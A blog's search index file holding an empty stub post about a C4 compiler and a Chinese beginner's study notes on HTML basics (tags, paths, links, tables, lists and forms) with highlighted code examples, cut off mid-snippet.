<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kawa c4 compiler</title>
    <link href="/2022/08/20/kawa-c4-compiler/"/>
    <url>/2022/08/20/kawa-c4-compiler/</url>
    
    <content type="html"><![CDATA[<h1 id="从零开始的C4编译器"><a href="#从零开始的C4编译器" class="headerlink" title="从零开始的C4编译器"></a>从零开始的C4编译器</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>front</title>
    <link href="/2022/06/30/front/"/>
    <url>/2022/06/30/front/</url>
    
    <content type="html"><![CDATA[<h1 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h1><p>跟着黑马程序员学</p><h2 id="0x01-网页与html"><a href="#0x01-网页与html" class="headerlink" title="0x01 网页与html"></a>0x01 网页与html</h2><div class="code-wrapper"><pre><code class="hljs">html是一种**超文本标记语言**网页是一个html文件，由前端人员书写，浏览器渲染而展现</code></pre></div><h3 id="web标准的组成"><a href="#web标准的组成" class="headerlink" title="web标准的组成"></a>web标准的组成</h3><div class="code-wrapper"><pre><code class="hljs">web主要由结构，表现，行为组成结构：html表现：css（设计外观样式）行为：JavaScript（用于交互）</code></pre></div><h3 id="html标签"><a href="#html标签" class="headerlink" title="html标签"></a>html标签</h3><h3 id="html语法规范"><a href="#html语法规范" class="headerlink" title="html语法规范"></a>html语法规范</h3><div class="code-wrapper"><pre><code class="hljs">html标签是用尖括号括起来的关键词有开始标签也有结束标签，结束标签加反斜杠&quot;/&quot;</code></pre></div><p>标签关系<br>包含关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs (html)">&lt;head&gt;<br>      &lt;title&gt; &lt;/title&gt;<br>&lt;/head&gt;<br></code></pre></td></tr></table></figure><p>并列关系</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;head&gt;</span> <span class="hljs-section">&lt;/head&gt;</span><br><span class="hljs-section">&lt;body&gt;</span> <span class="hljs-section">&lt;/body&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第一个页面"><a href="#第一个页面" class="headerlink" title="第一个页面"></a>第一个页面</h3><p>代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>第一个页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    键盘敲烂，工资过万<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下<br><img src="/2022/06/30/front/p1.png"><br>可见，head标签负责页面上方的部分，如页面的名字<br><img src="/2022/06/30/front/p2.png"><br>而body则是网站主体内容</p><h3 id="Vscode-利用写代码"><a href="#Vscode-利用写代码" class="headerlink" title="Vscode 利用写代码"></a>Vscode 利用写代码</h3><h3 id="DOCTYPE-以及-lang等字符集作用"><a href="#DOCTYPE-以及-lang等字符集作用" class="headerlink" title="!DOCTYPE 以及 lang等字符集作用"></a>!DOCTYPE 以及 lang等字符集作用</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>意思为，使用的是html语言<br><strong>必须写在文件第一行</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;html lang <span class="hljs-operator">=</span> <span class="hljs-string">&quot;en&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>lang语言种类。<br>1.en定义语言为英语<br>2.zh-CN为中文<br>定义是告诉浏览器，语言种类，定义为en也是可以显示中文的。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>UTF-8是万国码，几乎包含全世界所有国家用到的字符。</p><h3 id="html常用标签"><a href="#html常用标签" class="headerlink" title="html常用标签"></a>html常用标签</h3><p>根据标签语义，在合适的地方给一个最合理的标签，可以让页面结构更清晰。</p><h4 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> - <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> 我是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>标签语义：</strong><br>重要的，单列一行的加粗的文字<br>且h1最重要，大于h2，以此类推。一共有六级标题。</p><h4 id="段落和换行标签（重要）"><a href="#段落和换行标签（重要）" class="headerlink" title="段落和换行标签（重要）"></a>段落和换行标签<strong>（重要）</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;p&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是段落标签<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>全部素材、源码、ppt、素材、讲义都在置顶留言,去下载吧~~<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>也可以直接： https://gitee.com/xiaoqiang001/html_css_material.git 下载哈！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1. web端布局：先讲解HTML5常用标签，接着讲解CSS3常见样式增加的H5C3新特性，新语法，最后讲解<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如此，就能分段。<br><strong>换行标签</strong><br><strong>换行是单标签</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;br /&gt;</span><br></code></pre></td></tr></table></figure><p>br加空格，反斜杠。<br>强制文字换行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>的不同之处在于，段落间有空行，而换行是紧接着下一行开头开始的。<br></code></pre></td></tr></table></figure><h4 id="文本格式化标签"><a href="#文本格式化标签" class="headerlink" title="文本格式化标签"></a>文本格式化标签</h4><p>如<strong>粗体</strong>、<em>斜体</em>、下划线等等</p><p>加粗：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br></code></pre></td></tr></table></figure><p>斜体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>我是倾斜的文字<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>倾斜<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br></code></pre></td></tr></table></figure><p>删除线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs (html)">&lt;del&gt;我是删除线&lt;/del&gt;<br>&lt;s&gt;&lt;/s&gt;<br></code></pre></td></tr></table></figure><p>下划线：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span>我是下划线<span class="hljs-tag">&lt;/<span class="hljs-name">ins</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="div和span标签"><a href="#div和span标签" class="headerlink" title="div和span标签"></a>div和span标签</h4><p>这两个标签是无语义的，是放内容的盒子<br>div是division的缩写，表示分割，分区。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;百度&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;搜狐&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;新浪&lt;/<span class="hljs-selector-tag">span</span>&gt;<br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>百度 搜狐 新浪<br></code></pre></td></tr></table></figure><p>此两个标签一横一竖，用于布局</p><h4 id="图像标签和路径（重点）"><a href="#图像标签和路径（重点）" class="headerlink" title="图像标签和路径（重点）"></a>图像标签和路径（重点）</h4><p>1.图像标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;图像URL&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>src 是img标签的必须属性，它用于指定图像文件的路径和文件名。<br>img是单标签。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">可选参数<br>alt: 当图片显示不出来时，替换用<br><span class="hljs-built_in">title</span>：鼠标浮在图片上时，显示文字<br><span class="hljs-built_in">width</span>：修改图像的宽度<br><span class="hljs-built_in">height</span>：修改图像的高度<br><span class="hljs-built_in">border</span>：设置图像的边框粗细<br></code></pre></td></tr></table></figure><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>1.相对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">相对路径：<br>以**引用文件所在位置**为参考基础，而建立出的目录路径。<br>简单来说，图片相对于HTML页面的位置。<br>同一级引用：此html文件与引用图片位于同一层<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img.jpg&quot;</span> /&gt;<br>下一级引用：<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;images/img.jpg&quot;</span> /&gt;<br>上一级引用:<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;../img.jpg&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>2.绝对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img的url&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法:<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;跳转目标&quot;</span> <span class="hljs-attr">target</span> = <span class="hljs-string">&quot;窗口弹出方式&quot;</span>&gt;</span>文本或图片<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>外部链接跳转目标格式：<br>http://www.kawatsuki.com<br>需要写http与www.<br>内部链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;gons.html&quot;</span>&gt;</span>gons<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>即可<br>空链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#&quot;</span>&gt;</span>空连接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>显示为链接，但是不指向任何地方<br>下载链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;tar.zip&quot;</span>&gt;</span>下载文件<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>点击链接就会下载<br>锚点链接：快速跳转到本页面某处<br>语法：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>去往某处标题：<br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法<br><span class="hljs-comment">&lt;!-- ..... --&gt;</span><br>如<br><span class="hljs-comment">&lt;!--这是注释--&gt;</span><br>或快捷键：<br>ctrl + /<br>可快速注释<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">特殊字符<br>空格：<br><span class="hljs-meta">&amp;nbsp;</span><br>是一个空格<br><span class="hljs-meta">&amp;lt;</span><br><span class="hljs-meta">&amp;gt;</span><br>分别是小于号（less than）和大于号。<br>以<span class="hljs-meta">&amp;开头以;结尾</span><br></code></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h4 id="表格的基本语法"><a href="#表格的基本语法" class="headerlink" title="表格的基本语法"></a>表格的基本语法</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">table</span>&gt;<br>    &lt;<span class="hljs-selector-tag">tr</span>&gt;<br>        &lt;<span class="hljs-selector-tag">td</span>&gt;单元格中的文字&lt;/<span class="hljs-selector-tag">td</span>&gt;<br>        ...<br>    &lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>    ...<br>&lt;/<span class="hljs-selector-tag">table</span>&gt;<br><br><span class="hljs-selector-tag">table</span>是用于定义表格的标签<br><span class="hljs-selector-tag">tr</span>是表格中的行<br><span class="hljs-selector-tag">td</span>是<span class="hljs-selector-tag">table</span> data，定义表格中的单元格，必须嵌套在<span class="hljs-selector-tag">tr</span>内<br></code></pre></td></tr></table></figure><h4 id="表头单元格标签"><a href="#表头单元格标签" class="headerlink" title="表头单元格标签"></a>表头单元格标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">用<span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>words<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>代替<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">thead</span>&gt;<br>&lt;/<span class="hljs-selector-tag">thead</span>&gt;<br>可以用此包括第一个&lt;<span class="hljs-selector-tag">tr</span>&gt;&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>表示表头区域<br>&lt;<span class="hljs-selector-tag">tbody</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;/<span class="hljs-selector-tag">tbody</span>&gt;<br><span class="hljs-selector-tag">thead</span>与<span class="hljs-selector-tag">tbody</span>内必须有&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>此两个标签用于分割表头与表体，包含于&lt;<span class="hljs-selector-tag">table</span>&gt;内<br></code></pre></td></tr></table></figure><h4 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h4><p>合并单元格的方式：<br>跨行：rowspan = “合并单元格个数”<br>跨列：colspan = “合并单元格个数”<br>目标单元格：<br>跨行：写于最上侧单元格内。<br>跨列：在左侧单元格内。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">三部曲：<br>1.确定跨行还是跨列<br>2.找到目标单元格 <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;10&quot;</span>&gt;</span>woreds<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>3.删除多余格<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>1.无序列表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">语法：<br>&lt;<span class="hljs-selector-tag">ul</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span>&gt;<br>    ....<br>    &lt;/<span class="hljs-selector-tag">li</span>&gt;<br>&lt;/<span class="hljs-selector-tag">ul</span>&gt;<br>注意：<br><span class="hljs-selector-tag">ul</span>中，只能放<span class="hljs-selector-tag">li</span>标签<br><span class="hljs-selector-tag">li</span>中，可以放任何标签<br></code></pre></td></tr></table></figure><p>2.有序列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br>有序列表会自动加上1，2，3的样式，即有序。<br></code></pre></td></tr></table></figure><p>3.自定义列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">使用场景：<br>关注我们<br><br>新浪微博<br>官方微信<br>联系我们<br><br><br>这样的列表<br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>名词1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>如填写注册信息<br>用于收集用户信息。<br>表单的组成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.表单域<br>2.表单元素<br>3.提示信息<br><br></code></pre></td></tr></table></figure><h4 id="表单域"><a href="#表单域" class="headerlink" title="表单域"></a>表单域</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">表单域是一个包含表单元素的区域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>标签用于定义表单域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>会把它范围内的表单元素信息提交给服务器<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;url地址&quot;</span> <span class="hljs-attr">method</span> = <span class="hljs-string">&quot;提交方式&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;表单域名称&quot;</span>&gt;</span><br>....<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h4><p>1.input输入表单元素<br>2.select下拉表单元素<br>3.textarea文本域元素</p><p>input:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span>&gt;是单标签，用于收集用户信息。<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;属性值&quot;/&gt;<br>属性值有<br><span class="hljs-type">text</span>（文本）<br><br><br>&lt;form&gt;<br>    用户名：&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;text&quot;/&gt;<br>&lt;/form&gt;<br><br><span class="hljs-keyword">password</span>（密码）<br>输入的是星号，不会泄露<br><br><br>radio（单选）<br>性别：男&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt; 女&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt;<br><span class="hljs-keyword">input</span>内必须有<span class="hljs-type">name</span>元素，且相同，才能达到单选的目的<br><br><br>checkbox（多选）<br>爱好：吃饭&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox&quot;/&gt;  睡觉&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot; 打豆豆&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot;<br><br><br></code></pre></td></tr></table></figure><p>name属性：分别不同表单元素<br>value属性：给此元素一个默认值，如“请输入用户名”。单选框也应写value，用于向后台传递信息。即规定input元素值。<br><strong>以上两个元素，每个input都应该有！</strong><br><br><br>checked属性：当页面打开的时候，会默认选中该按钮（单选或复选）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>maxlength：规定输入最大长度</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span> maxlength <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><br><br>提交按钮submit<br>重置按钮reset</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span> value = <span class="hljs-string">&quot;免费注册&quot;</span>&gt;<br>可以用value值来替换“提交”<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;reset&quot;</span> value = <span class="hljs-string">&quot;重新填写&quot;</span>&gt;<br>还原为默认值<br></code></pre></td></tr></table></figure><p>普通按钮button<br>文件域file</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 